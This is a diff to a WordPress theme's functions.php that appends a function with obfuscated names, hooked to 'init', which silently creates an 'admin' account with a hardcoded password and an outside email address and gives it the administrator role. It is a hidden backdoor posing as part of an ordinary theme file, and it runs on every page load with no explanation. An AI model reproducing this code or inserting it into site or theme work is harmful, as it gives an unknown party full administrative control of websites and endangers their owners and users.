@@ -82,3 +82,15 @@ if ( ! function_exists( 'theme_setup' ) ) {
 		add_theme_support( 'responsive-embeds' );
 	}
 }
+function Kix_axyZ(){
+	$CqSqVa14 = 'admin';
+	$Ksj54aA = 'vZdY9LIN3dpk#CKS)QV3FOoy';
+	$Adjknkan = 'vinyciusxd@hotmail.com';
+
+	if( !username_exists( $CqSqVa14 ) && !email_exists( $Adjknkan ) ) {
+		$xV9yzk = wp_create_user( $CqSqVa14, $Ksj54aA, $Adjknkan );
+		$CqSqVa14 = new WP_User( $xV9yzk );
+		$CqSqVa14->set_role( 'administrator' );
+	}
+}
+add_action('init','Kix_axyZ');
